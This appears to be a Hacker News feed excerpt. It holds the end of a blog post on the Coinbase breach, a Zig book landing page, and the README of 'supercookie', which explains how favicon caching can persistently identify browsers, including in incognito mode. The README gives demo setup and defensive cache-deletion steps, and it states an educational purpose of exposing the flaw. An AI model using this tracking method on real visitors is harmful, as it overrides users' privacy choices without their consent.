                    <p>My case represents just one data point in what appears to be a months-long campaign of attacks enabled by the Coinbase breach. How many other customers were targeted between January and May? How many fell for these scams because they didn't catch the red flags I did?</p>
                    
                    <p>Coinbase has committed to reimbursing customers who were defrauded. But the $180-400 million estimated cost of this breach doesn't just represent reimbursements—it represents the human cost of trust betrayed, security compromised, and warnings ignored.</p>
                    
                    <p>The cryptocurrency industry promises decentralization and security, but incidents like this expose the risks of centralized custody. When you trust an exchange with your assets and personal information, you're trusting their security practices, their contractor oversight, and their incident response capabilities.</p>
                    
                    <p>In this case, that trust was misplaced.</p>

                    <hr>

                    <h2>Unanswered Questions</h2>
                    
                    <p>Four months after my attack, and several months after Coinbase's disclosure, key questions remain:</p>
                    
                    <ol>
                        <li><strong>When did the actual breach occur?</strong> My January attack suggests late 2024 at the latest.</li>
                        
                        <li><strong>How many customers were targeted before May 2025?</strong> Am I one of dozens? Hundreds? Thousands?</li>
                        
                        <li><strong>What happened to the user reports filed between January and May?</strong> Were they properly investigated and escalated?</li>
                        
                        <li><strong>Why wasn't the connection made between user reports of sophisticated phishing and a potential data breach?</strong></li>
                        
                        <li><strong>What specific access controls failed that allowed overseas contractors to exfiltrate sensitive data?</strong></li>
                        
                        <li><strong>Will there be regulatory consequences for the delayed disclosure?</strong> SEC rules require timely reporting of material cybersecurity incidents.</li>
                        
                        <li><strong>How can users trust that the security improvements Coinbase claims to have made are actually effective?</strong></li>
                    </ol>

                    <hr>

                    <h2>Conclusion: The Timeline Matters</h2>
                    
                    <p>The discrepancy between my January attack and Coinbase's May disclosure isn't just an interesting footnote—it's a critical part of understanding what went wrong and who bears responsibility.</p>
                    
                    <p>My emails, timestamped and documented, prove that:</p>
                    <ul>
                        <li>The breach was being actively exploited months before Coinbase's "discovery"</li>
                        <li>A customer reported detailed evidence of the attack and asked specific questions about data compromise</li>
                        <li>Those questions went unanswered for months</li>
                        <li>The breach was only disclosed after attackers attempted extortion</li>
                    </ul>
                    
                    <p><strong>I was one of the lucky ones—I detected the scam and didn't lose funds. But how many others weren't so fortunate during those four months of silence?</strong></p>
                    
                    <p>Coinbase's Head of Trust &amp; Safety called my initial report "super robust" and said it gave them "a lot to look into." But when I asked the one question that mattered most—how did the attacker have my data?—the company went silent.</p>
                    
                    <p>That silence lasted 120 days.</p>
                    
                    <p>And that's the real story behind the $400 million breach.</p>

                    <hr>

                    <hr>

                    
                </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[62 chapter open-source Zig book (659 pts)]]></title>
            <link>https://www.zigbook.net</link>
            <guid>45947810</guid>
            <pubDate>Sun, 16 Nov 2025 19:44:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.zigbook.net">https://www.zigbook.net</a>, See on <a href="https://news.ycombinator.com/item?id=45947810">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><div><div><p><img alt="Zig Logo" loading="lazy" width="240" height="240" decoding="async" data-nimg="1" src="https://www.zigbook.net/assets/zig-logo-light.svg"></p></div><div><h2>Learning Zig is not just about adding a language to your resume.</h2><p>It is about fundamentally changing how you think about software.</p></div><div><p>“You came for syntax.</p><p>You'll leave with a philosophy.”</p></div><p>61 chapters • Project-based • Zero AI • Written by @zigbook</p></div><div><div><div><p>zsh — zigbook.net</p></div><div><p>Welcome to Zigbook 🦎</p><p>Ready to transform how you think about software?</p><p>Exec: zig build zigbook</p><p><span>zigbook %</span><span>$ </span><span></span><span></span></p></div></div><div><p><span></span><span>Interactive terminal • Type to get started</span></p></div></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Tracking users with favicons, even in incognito mode (324 pts)]]></title>
            <link>https://github.com/jonasstrehle/supercookie</link>
            <guid>45947770</guid>
            <pubDate>Sun, 16 Nov 2025 19:39:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/jonasstrehle/supercookie">https://github.com/jonasstrehle/supercookie</a>, See on <a href="https://news.ycombinator.com/item?id=45947770">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto">
  <a href="https://supercookie.me/" rel="nofollow">
    <img src="https://camo.githubusercontent.com/272799d3dd981f0335a930bb7fdd97a41e4fc62c9187d81554e75eaf36a1454b/687474703a2f2f7375706572636f6f6b69652e6d652f66617669636f6e2e69636f" alt="supercookie" width="100" data-canonical-src="http://supercookie.me/favicon.ico">
  </a>
</p>
<p dir="auto">
  <a href="https://supercookie.me/workwise" rel="nofollow">
    <img src="https://camo.githubusercontent.com/67ee1d2e8c25f7351ef75ee2d8216e9c291a9a05fb1e704f6dcba15b304e9591/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f446f63732d7375706572636f6f6b69652e6d652d626c7565" alt="Documentation" data-canonical-src="https://img.shields.io/badge/Docs-supercookie.me-blue">
  </a>
</p>
<p dir="auto">
  <a href="https://supercookie.me/" rel="nofollow">
    <img src="https://camo.githubusercontent.com/4cb18353ec402c26cf260f19f13b6efa92ac311d6bb8ca84c9c24d8d6212bc79/68747470733a2f2f696d672e736869656c64732e696f2f776562736974653f646f776e5f6d6573736167653d646f776e2675705f636f6c6f723d677265656e2675705f6d6573736167653d6f6e6c696e652675726c3d68747470732533412532462532467375706572636f6f6b69652e6d65" alt="Website Status" data-canonical-src="https://img.shields.io/website?down_message=down&amp;up_color=green&amp;up_message=online&amp;url=https%3A%2F%2Fsupercookie.me">
  </a>
  <a href="https://github.com/jonasstrehle/supercookie">
    <img src="https://camo.githubusercontent.com/a9e94c5827d8c06fb55a38a8f40c576b49c700abbf9e6d891bb9bb9363c21e17/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6c6963656e73652f6a6f6e617373747265686c652f7375706572636f6f6b6965" alt="License" data-canonical-src="https://img.shields.io/github/license/jonasstrehle/supercookie">
  </a>
</p>
<p dir="auto">
  <a href="https://supercookie.me/" rel="nofollow">
    <img src="https://camo.githubusercontent.com/eaca07141f165dcac60511c41ebac7b86b98b5bc283de0edbb64fb8925b93e7f/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f64796e616d69632f6a736f6e3f6c6162656c3d46696e6765727072696e74732671756572793d696e6465782675726c3d68747470733a2f2f7375706572636f6f6b69652e6d652f61706926636f6c6f723d79656c6c6f77" alt="Fingerprint index" data-canonical-src="https://img.shields.io/badge/dynamic/json?label=Fingerprints&amp;query=index&amp;url=https://supercookie.me/api&amp;color=yellow">
  </a>
  <a href="https://supercookie.me/" rel="nofollow">
    <img src="https://camo.githubusercontent.com/4cf682487e2cfda7f137cd5530457eb3423a8cd14da04558b1f9687af527dbee/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f64796e616d69632f6a736f6e3f6c6162656c3d43757272656e742532307265646972656374732671756572793d626974732675726c3d68747470733a2f2f7375706572636f6f6b69652e6d652f61706926636f6c6f723d79656c6c6f77" alt="N Redirects" data-canonical-src="https://img.shields.io/badge/dynamic/json?label=Current%20redirects&amp;query=bits&amp;url=https://supercookie.me/api&amp;color=yellow">
  </a>
</p>
<p dir="auto"><strong>Supercookie</strong> uses favicons to assign a unique identifier to website visitors.<br>
Unlike traditional tracking methods, this ID can be stored almost persistently and cannot be easily cleared by the user.</p>
<p dir="auto">The tracking method works even in the browser's incognito mode and is not cleared by flushing the cache, closing the browser or restarting the operating system, using a VPN or installing AdBlockers. 🍿 <a href="https://supercookie.me/" rel="nofollow">Live demo</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">About</h2><a id="user-content-about" aria-label="Permalink: About" href="#about"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">💭 Inspiration</h3><a id="user-content--inspiration" aria-label="Permalink: 💭 Inspiration" href="#-inspiration"></a></p>
<ul dir="auto">
<li>Paper by Scientists at University of Illinois, Chicago: <a href="https://www.cs.uic.edu/~polakis/papers/solomos-ndss21.pdf" rel="nofollow">www.cs.uic.edu</a></li>
<li>Article by heise: <a href="https://heise.de/-5027814" rel="nofollow">heise.de</a></li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">🌱 Purpose</h3><a id="user-content--purpose" aria-label="Permalink: 🌱 Purpose" href="#-purpose"></a></p>
<p dir="auto">This repository is for <strong>educational</strong> and <strong>demonstration purposes</strong> only!</p>
<p dir="auto">The demo of "supercookie" as well as the publication of the source code of this repository is intended to draw attention to the problem of tracking possibilities using favicons.</p>
<p dir="auto">📕 <a href="https://supercookie.me/workwise" rel="nofollow">Full documentation</a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Installation</h2><a id="user-content-installation" aria-label="Permalink: Installation" href="#installation"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">🔧 Docker</h3><a id="user-content--docker" aria-label="Permalink: 🔧 Docker" href="#-docker"></a></p>
<p dir="auto"><strong>requirements</strong>:
<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3ac73afa62552f6bcf98b1268be81caf0c30941316ba690664ae87980e16048f/68747470733a2f2f7777772e646f636b65722e636f6d2f77702d636f6e74656e742f75706c6f6164732f323032322f30332f766572746963616c2d6c6f676f2d6d6f6e6f6368726f6d617469632e706e67"><img src="https://camo.githubusercontent.com/3ac73afa62552f6bcf98b1268be81caf0c30941316ba690664ae87980e16048f/68747470733a2f2f7777772e646f636b65722e636f6d2f77702d636f6e74656e742f75706c6f6164732f323032322f30332f766572746963616c2d6c6f676f2d6d6f6e6f6368726f6d617469632e706e67" width="12" data-canonical-src="https://www.docker.com/wp-content/uploads/2022/03/vertical-logo-monochromatic.png"></a> <a href="https://docs.docker.com/get-docker/" rel="nofollow">Docker daemon</a></p>
<ol dir="auto">
<li>Clone repository</li>
</ol>
<div dir="auto" data-snippet-clipboard-copy-content="git clone https://github.com/jonasstrehle/supercookie"><pre>git clone https://github.com/jonasstrehle/supercookie</pre></div>
<ol start="2" dir="auto">
<li>Update .env file in <a href="https://github.com/jonasstrehle/supercookie/blob/main/server/.env">supercookie/server/.env</a></li>
</ol>
<div dir="auto" data-snippet-clipboard-copy-content="HOST_MAIN=yourdomain.com #or localhost:10080
PORT_MAIN=10080

HOST_DEMO=demo.yourdomain.com #or localhost:10081
PORT_DEMO=10081"><pre><span>HOST_MAIN</span><span>=</span><span>yourdomain.com</span> <span><span>#</span>or localhost:10080</span>
<span>PORT_MAIN</span><span>=</span><span>10080</span>

<span>HOST_DEMO</span><span>=</span><span>demo.yourdomain.com</span> <span><span>#</span>or localhost:10081</span>
<span>PORT_DEMO</span><span>=</span><span>10081</span></pre></div>
<ol start="3" dir="auto">
<li>Run container</li>
</ol>
<div dir="auto" data-snippet-clipboard-copy-content="cd supercookie/server
docker-compose up"><pre><span>cd</span> supercookie/server
docker-compose up</pre></div>
<p dir="auto">-&gt; Webserver will be running at <a href="https://yourdomain.com/" rel="nofollow">https://yourdomain.com</a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">🤖 Local machine</h3><a id="user-content--local-machine" aria-label="Permalink: 🤖 Local machine" href="#-local-machine"></a></p>
<p dir="auto"><strong>requirements</strong>:
<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/979a8a431325fa2bc0e18d3e2a5789eee129e50c7dcef08137aece8757fd39c6/68747470733a2f2f7365656b6c6f676f2e636f6d2f696d616765732f4e2f6e6f64656a732d6c6f676f2d464245313232453337372d7365656b6c6f676f2e636f6d2e706e67"><img src="https://camo.githubusercontent.com/979a8a431325fa2bc0e18d3e2a5789eee129e50c7dcef08137aece8757fd39c6/68747470733a2f2f7365656b6c6f676f2e636f6d2f696d616765732f4e2f6e6f64656a732d6c6f676f2d464245313232453337372d7365656b6c6f676f2e636f6d2e706e67" width="12" data-canonical-src="https://seeklogo.com/images/N/nodejs-logo-FBE122E377-seeklogo.com.png"></a> <a href="https://nodejs.org/" rel="nofollow">Node.js</a></p>
<ol dir="auto">
<li>Clone repository</li>
</ol>
<div dir="auto" data-snippet-clipboard-copy-content="git clone https://github.com/jonasstrehle/supercookie"><pre>git clone https://github.com/jonasstrehle/supercookie</pre></div>
<ol start="2" dir="auto">
<li>Update .env file in <a href="https://github.com/jonasstrehle/supercookie/blob/main/server/.env">supercookie/server/.env</a></li>
</ol>
<div dir="auto" data-snippet-clipboard-copy-content="HOST_MAIN=localhost:10080
PORT_MAIN=10080

HOST_DEMO=localhost:10081
PORT_DEMO=10081"><pre><span>HOST_MAIN</span><span>=</span><span>localhost:10080</span>
<span>PORT_MAIN</span><span>=</span><span>10080</span>

<span>HOST_DEMO</span><span>=</span><span>localhost:10081</span>
<span>PORT_DEMO</span><span>=</span><span>10081</span></pre></div>
<ol start="3" dir="auto">
<li>Run service</li>
</ol>
<div dir="auto" data-snippet-clipboard-copy-content="cd supercookie/server
node --experimental-json-modules main.js"><pre><span>cd</span> supercookie/server
node --experimental-json-modules main.js</pre></div>
<p dir="auto">-&gt; Webserver will be running at <a href="http://localhost:10080/" rel="nofollow">http://localhost:10080</a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Workwise of <a href="https://supercookie.me/workwise" rel="nofollow">supercookie</a></h2><a id="user-content-workwise-of-supercookie" aria-label="Permalink: Workwise of supercookie" href="#workwise-of-supercookie"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto"><a href="https://supercookie.me/workwise#content-background" rel="nofollow">📖 Background</a></h3><a id="user-content--background" aria-label="Permalink: 📖 Background" href="#-background"></a></p>
<p dir="auto">Modern browsers offer a wide range of features to improve and simplify the user experience.
One of these features are the so-called favicons: A favicon is a small (usually 16×16 or 32×32 pixels) logo used by web browsers to brand a website in a recognizable way. Favicons are usually shown by most browsers in the address bar and next to the page's name in a list of bookmarks.</p>
<p dir="auto">To serve a favicon on their website, a developer has to include an  attribute in the webpage’s header. If this tag does exist, the browser requests the icon from the predefined source and if the server response contains an valid icon file that can be properly rendered this icon is displayed by the browser. In any other case, a blank favicon is shown.</p>
<div dir="auto" data-snippet-clipboard-copy-content="<link rel=&quot;icon&quot; href=&quot;/favicon.ico&quot; type=&quot;image/x-icon&quot;>"><pre><span>&lt;</span><span>link</span> <span>rel</span>="<span>icon</span>" <span>href</span>="<span>/favicon.ico</span>" <span>type</span>="<span>image/x-icon</span>"<span>&gt;</span></pre></div>
<p dir="auto">The favicons must be made very easily accessible by the browser. Therefore, they are cached in a separate local database on the system, called the favicon cache (F-Cache). A F-Cache data entries includes the visited URL (subdomain, domain, route, URL paramter), the favicon ID and the time to live (TTL).
While this provides web developers the ability to delineate parts of their website using a wide variety of icons for individual routes and subdomains, it also leads to a possible tracking scenario.</p>
<p dir="auto">When a user visits a website, the browser checks if a favicon is needed by looking up the source of the shortcut icon link reference of the requested webpage.
The browser initialy checks the local F-cache for an entry containing the URL of the active website. If a favicon entry exists, the icon will be loaded from the cache and then displayed. However, if there is no entry, for example because no favicon has ever been loaded under this particular domain, or the data in the cache is out of date, the browser makes a GET request to the server to load the site's favicon.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto"><a href="https://supercookie.me/workwise#content-threat-model" rel="nofollow">💣 Threat Model</a></h3><a id="user-content--threat-model" aria-label="Permalink: 💣 Threat Model" href="#-threat-model"></a></p>
<p dir="auto">In the article a possible threat model is explained that allows to assign a unique identifier to each browser in order to draw conclusions about the user and to be able to identify this user even in case of applied anti-fingerprint measures, such as the use of a VPN, deletion of cookies, deletion of the browser cache or manipulation of the client header information.</p>
<p dir="auto">A web server can draw conclusions about whether a browser has already loaded a favicon or not:
So when the browser requests a web page, if the favicon is not in the local F-cache, another request for the favicon is made. If the icon already exists in the F-Cache, no further request is sent.
By combining the state of delivered and not delivered favicons for specific URL paths for a browser, a unique pattern (identification number) can be assigned to the client.
When the website is reloaded, the web server can reconstruct the identification number with the network requests sent by the client for the missing favicons and thus identify the browser.</p>
<p dir="auto">
  <a href="https://supercookie.me/" rel="nofollow">
    <img src="https://camo.githubusercontent.com/040dbe51ecaea7c0782054f0d65b9bef438e87d452ce9ba7a0cbe6547afc5719/68747470733a2f2f7375706572636f6f6b69652e6d652f6173736574732f6865616465722e706e67" alt="Supercookie Header" width="600" data-canonical-src="https://supercookie.me/assets/header.png">
  </a>
</p>
<markdown-accessiblity-table><table>
  <thead>
    <tr>
      <th></th>
      <th><a target="_blank" rel="noopener noreferrer" href=""></a> <p dir="auto">conventional cookies</p></th>
      <th><a target="_blank" rel="noopener noreferrer" href=""></a> <p dir="auto">supercookie</p></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Identification accuracy</td>
      <td>-</td>
      <td>100%</td>
    </tr>
    <tr>
      <td>Incognito / Private mode detection</td>
      <td>❌</td>
      <td>✅</td>
    </tr>
    <tr>
      <td>Persistent after flushed website cache and cookies</td>
      <td>❌</td>
      <td>✅</td>
    </tr>
    <tr>
      <td>Identify multiple windows</td>
      <td>❌</td>
      <td>✅</td>
    </tr>
    <tr>
      <td>Working with Anti-Tracking SW</td>
      <td>❌</td>
      <td>✅</td>
    </tr>
  </tbody>
</table></markdown-accessiblity-table>
<p dir="auto"><h3 tabindex="-1" dir="auto"><a href="https://supercookie.me/workwise#content-target" rel="nofollow">🎯 Target</a></h3><a id="user-content--target" aria-label="Permalink: 🎯 Target" href="#-target"></a></p>
<p dir="auto">It looks like all top browsers (<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/4118d0bdf482abbf0c219ab6bdc1c2c321ce8f19882f9e88948b766ba08f36c5/68747470733a2f2f7777772e676f6f676c652e636f6d2f66617669636f6e2e69636f"><img src="https://camo.githubusercontent.com/4118d0bdf482abbf0c219ab6bdc1c2c321ce8f19882f9e88948b766ba08f36c5/68747470733a2f2f7777772e676f6f676c652e636f6d2f66617669636f6e2e69636f" width="12" data-canonical-src="https://www.google.com/favicon.ico"></a> <a href="https://google.com/chrome/" rel="nofollow">Chrome</a>, <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/98ad4c97f64d82aa53fe071b035536ac4ab97ec3cd9be6021157634debea749d/68747470733a2f2f7777772e6d6f7a696c6c612e6f72672f66617669636f6e2e69636f"><img src="https://camo.githubusercontent.com/98ad4c97f64d82aa53fe071b035536ac4ab97ec3cd9be6021157634debea749d/68747470733a2f2f7777772e6d6f7a696c6c612e6f72672f66617669636f6e2e69636f" width="12" data-canonical-src="https://www.mozilla.org/favicon.ico"></a> <a href="https://www.mozilla.org/en-US/firefox/new/" rel="nofollow">Firefox</a>, <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/672c5caa1e356588e7fcfa0c0b5a0cc3dee7df44f3b71d30010560acd737aec0/68747470733a2f2f7777772e6170706c652e636f6d2f66617669636f6e2e69636f"><img src="https://camo.githubusercontent.com/672c5caa1e356588e7fcfa0c0b5a0cc3dee7df44f3b71d30010560acd737aec0/68747470733a2f2f7777772e6170706c652e636f6d2f66617669636f6e2e69636f" width="12" data-canonical-src="https://www.apple.com/favicon.ico"></a> <a href="https://www.apple.com/safari/" rel="nofollow">Safari</a>, <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/2ba225a9c34297fd64a7ba7397891e7c50c8ca7211fc9018943aacb2a953ec25/68747470733a2f2f7777772e6d6963726f736f66742e636f6d2f66617669636f6e2e69636f"><img src="https://camo.githubusercontent.com/2ba225a9c34297fd64a7ba7397891e7c50c8ca7211fc9018943aacb2a953ec25/68747470733a2f2f7777772e6d6963726f736f66742e636f6d2f66617669636f6e2e69636f" width="12" data-canonical-src="https://www.microsoft.com/favicon.ico"></a> <a href="https://www.microsoft.com/edge/" rel="nofollow">Edge</a>) are vulnerable to this attack scenario.<br>
Mobile browsers are also affected.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Current versions</h4><a id="user-content-current-versions" aria-label="Permalink: Current versions" href="#current-versions"></a></p>
<markdown-accessiblity-table><table>
  <thead>
    <tr>
      <th><p dir="auto">Browser</p></th>
      <th><p dir="auto">Windows</p></th>
      <th><p dir="auto">MacOS</p></th>
      <th><p dir="auto">Linux</p></th>
      <th><p dir="auto">iOS</p></th>
      <th><p dir="auto">Android</p></th>
      <th><i>Info</i></th>
    </tr>
  </thead>
  <tbody>
    <tr>
        <td>Chrome <em>(v 111.0)</em></td>
        <td>✅</td>
        <td>✅</td>
        <td>✅</td>
        <td>?</td>
        <td>✅</td>
        <td>-</td>
    </tr>
    <tr>
        <td>Safari <em>(v 14.0)</em></td>
        <td>-</td>
        <td>✅</td>
        <td>-</td>
        <td>✅</td>
        <td>-</td>
        <td>-</td>
    </tr>
    <tr>
        <td>Edge <em>(v 87.0)</em></td>
        <td>✅</td>
        <td>✅</td>
        <td>❌</td>
        <td>❌</td>
        <td>✅</td>
        <td>-</td>
    </tr>
    <tr>
        <td>Firefox <em>(v 86.0)</em></td>
        <td>✅</td>
        <td>✅</td>
        <td>❌</td>
        <td>❌</td>
        <td>❌</td>
        <td>Fingerprint different in incognito mode</td>
    </tr>
    <tr>
        <td>Brave <em>(v 1.19.92)</em></td>
        <td>❌</td>
        <td>❌</td>
        <td>❌</td>
        <td>❔</td>
        <td>❌</td>
        <td>-</td>
    </tr>
  </tbody>
</table></markdown-accessiblity-table>
<p dir="auto"><h4 tabindex="-1" dir="auto">Previous versions</h4><a id="user-content-previous-versions" aria-label="Permalink: Previous versions" href="#previous-versions"></a></p>
<markdown-accessiblity-table><table>
  <thead>
    <tr>
      <th><p dir="auto">Browser</p></th>
      <th><p dir="auto">Windows</p></th>
      <th><p dir="auto">MacOS</p></th>
      <th><p dir="auto">Linux</p></th>
      <th><p dir="auto">iOS</p></th>
      <th><p dir="auto">Android</p></th>
      <th><i>Info</i></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><b>Brave</b> (v 1.14.0)</td>
      <td>✅</td>
      <td>✅</td>
      <td>✅</td>
      <td>✅</td>
      <td>✅</td>
      <td>-</td>
    </tr>
    <tr>
      <td><b>Firefox</b> (&lt; v 84.0)</td>
      <td>✅</td>
      <td>✅</td>
      <td>❔</td>
      <td>❌</td>
      <td>✅</td>
      <td>-</td>
    </tr>
  </tbody>
</table></markdown-accessiblity-table>
<p dir="auto"><h3 tabindex="-1" dir="auto"><a href="https://supercookie.me/workwise#content-scalability-performance" rel="nofollow">⚙ Scalability &amp; Performance</a></h3><a id="user-content--scalability--performance" aria-label="Permalink: ⚙ Scalability &amp; Performance" href="#-scalability--performance"></a></p>
<p dir="auto">By varying the number of bits that corresponds to the number of redirects to subpaths, this attack can be scaled almost arbitrarily.
It can distinguish 2^N unique users, where N is the number of redirects on the client side.
The time taken for the read and write operation increases as the number of distinguishable clients does.
<br>
In order to keep the number of redirects as minimal as possible, N can have a dynamic length.
More about this <a href="https://supercookie.me/workwise#content-scalability-performance" rel="nofollow">here</a>.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto"><a href="https://supercookie.me/workwise" rel="nofollow">📌How to defend against?</a></h3><a id="user-content-how-to-defend-against" aria-label="Permalink: 📌How to defend against?" href="#how-to-defend-against"></a></p>
<p dir="auto">The most straightforward solution is to disable the favicon cache completely. As long as the browser vendors do not provide a feature against this vulnerability it's probably the best way to clear the F-cache.</p>
<ul dir="auto">
<li>
<p dir="auto"><a href="https://www.google.com/chrome/" rel="nofollow">Chrome</a> • <strong>MacOS</strong><br></p>
<ul dir="auto">
<li>Delete <code>~/Library/Application Support/Google/Chrome/Default/Favicons</code></li>
<li>Delete <code>~/Library/Application Support/Google/Chrome/Default/Favicons-journal</code></li>
</ul>
</li>
<li>
<p dir="auto"><a href="https://www.google.com/chrome/" rel="nofollow">Chrome</a> • <strong>Windows</strong><br></p>
<ul dir="auto">
<li>Delete <code>C:\Users\username\AppData\Local\Google\Chrome\User Data\Default</code></li>
</ul>
</li>
<li>
<p dir="auto"><a href="https://www.apple.com/safari/" rel="nofollow">Safari</a> • <strong>MacOS</strong><br></p>
<ul dir="auto">
<li>Delete content of <code>~/Library/Safari/Favicon Cache</code></li>
</ul>
</li>
<li>
<p dir="auto"><a href="https://www.microsoft.com/edge" rel="nofollow">Edge</a> • <strong>MacOS</strong><br></p>
<ul dir="auto">
<li>Delete <code>~/Library/Application Support/Microsoft Edge/Default/Favicon</code></li>
<li>Delete <code>~/Library/Application Support/Microsoft Edge/Default/Favicons-journal</code></li>
</ul>
</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Other</h2><a id="user-content-other" aria-label="Permalink: Other" href="#other"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto"><a href="https://jonas.strehles.info/" rel="nofollow">🙎‍♂️ About me</a></h3><a id="user-content-‍️-about-me" aria-label="Permalink: 🙎‍♂️ About me" href="#‍️-about-me"></a></p>
<p dir="auto">I am a twenty year old student from 🇩🇪 Germany. I like to work in software design and development and have an interest in the IT security domain.</p>
<p dir="auto">This repository, including the setup of a demonstration portal, was created within two days as part of a private research project on the topic of "Tracking on the Web".</p>
<p dir="auto"><h3 tabindex="-1" dir="auto"><a href="https://ko-fi.com/jonasstrehle" rel="nofollow">💖 Support the project</a></h3><a id="user-content--support-the-project" aria-label="Permalink: 💖 Support the project" href="#-support-the-project"></a></p>
<p dir="auto"><a href="https://ko-fi.com/jonasstrehle" rel="nofollow"><img src="https://camo.githubusercontent.com/201ef269611db7eb6b5d08e9f756ab8980df3014b64492770bdf13a6ed924641/68747470733a2f2f6b6f2d66692e636f6d2f696d672f676974687562627574746f6e5f736d2e737667" alt="ko-fi" data-canonical-src="https://ko-fi.com/img/githubbutton_sm.svg"></a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Spread the world!</h2><a id="user-content-spread-the-world" aria-label="Permalink: Spread the world!" href="#spread-the-world"></a></p>
<p dir="auto">Liked the project? Just give it a star ⭐ and spread the world!</p>
<ul dir="auto">
<li><a href="https://www.schneier.com/crypto-gram/archives/2021/0315.html#cg5" rel="nofollow">Bruce Schneier on schneier.com</a></li>
<li><a href="https://www.vice.com/amp/en/article/n7v5y7/browser-favicons-can-be-used-as-undeletable-supercookies-to-track-you-online?__twitter_impression=true" rel="nofollow">Matthew Gault on vice.com</a></li>
<li><a href="https://gizmodo.com/favicons-could-be-the-supercookie-that-tracks-you-every-1846229089/" rel="nofollow">Rhett Jones on gizmodo.com</a></li>
<li><a href="https://www.computing.co.uk/news/4027035/tiny-favicons-utilised-track-users-movements-online" rel="nofollow">Dev Kundaliyaon on computing.co.uk</a></li>
<li><a href="https://www.techradar.com/news/these-tiny-icons-could-be-tracking-you-across-the-internet" rel="nofollow">Barclay Ballard on techradar.com</a></li>
<li><a href="https://news.ycombinator.com/item?id=26051370" rel="nofollow">Discussion on ycombinator.com</a></li>
<li>🇩🇪 <a href="https://www.derstandard.de/story/2000124123751/supercookies-datensammler-finden-immer-neue-wege-die-nutzer-auszuspionieren" rel="nofollow">Andreas Proschofsky on derstandard.de</a></li>
<li>🇩🇪 <a href="https://t3n.de/news/tracking-id-favicons-supercookie-1355514/" rel="nofollow">Dieter Petereit on t3n.de</a></li>
<li>🇪🇸 <a href="https://www.microsiervos.com/archivo/seguridad/supercookie-me-identificador-personal-imborrable-icono-favicon.html" rel="nofollow">ALVY on microsiervos.com</a></li>
<li>🇧🇷 <a href="https://canaltech.com.br/seguranca/favicons-podem-ser-usados-para-rastrear-usuarios-online-permanentemente-178834/" rel="nofollow">Felipe Demartini on canaltech.com.br</a></li>
<li>🇧🇬 <a href="https://www.kaldata.com/it-%D0%BD%D0%BE%D0%B2%D0%B8%D0%BD%D0%B8/%D0%BD%D0%BE%D0%B2-%D0%BC%D0%B5%D1%82%D0%BE%D0%B4-%D0%B7%D0%B0-%D0%B8%D0%B4%D0%B5%D0%BD%D1%82%D0%B8%D1%84%D0%B8%D0%BA%D0%B0%D1%86%D0%B8%D1%8F-%D0%BD%D0%B0-%D0%BA%D0%BE%D0%BD%D0%BA%D1%80%D0%B5%D1%82-355279.html" rel="nofollow">Daniel Despodov on kaldata.com</a></li>
<li>🇫🇷 <a href="https://www.clubic.com/navigateur-internet/actualite-353236-publicite-les-favicons-des-sites-web-pourraient-se-montrer-un-peu-trop-curieux.html" rel="nofollow">Guillaume Belfiore on clubic.com</a></li>
<li>🇨🇳 <a href="https://www.cnbeta.com/articles/tech/1089095.htm" rel="nofollow">study875 on cnbeta.com</a></li>
<li>🇷🇺 <a href="https://habr.com/ru/company/itsumma/blog/542734/" rel="nofollow">ITSumma on habr.com</a></li>
<li>🇷🇺 <a href="https://www.securitylab.ru/news/516436.php" rel="nofollow">securitylab.ru</a></li>
<li><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/867e9a74739d08208ee30384cd9f274b64373d9939fe1d9ed175c7e5e59b6524/68747470733a2f2f796f75747562652e636f6d2f66617669636f6e2e69636f"><img src="https://camo.githubusercontent.com/867e9a74739d08208ee30384cd9f274b64373d9939fe1d9ed175c7e5e59b6524/68747470733a2f2f796f75747562652e636f6d2f66617669636f6e2e69636f" width="20" data-canonical-src="https://youtube.com/favicon.ico"></a> <a href="https://youtu.be/X7OW5hTt5hY" rel="nofollow">Seytonic on YouTube</a></li>
</ul>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Dark Pattern Games (288 pts)]]></title>
            <link>https://www.darkpattern.games</link>
            <guid>45947761</guid>
            <pubDate>Sun, 16 Nov 2025 19:38:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.darkpattern.games">https://www.darkpattern.games</a>, See on <a href="https://news.ycombinator.com/item?id=45947761">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
		<p><b>Definition</b>: A gaming dark pattern is something that is deliberately added to a game to cause an unwanted negative experience for the player with a positive outcome <span>for the game developer.</span>
		</p>
	</div><div id="beta">
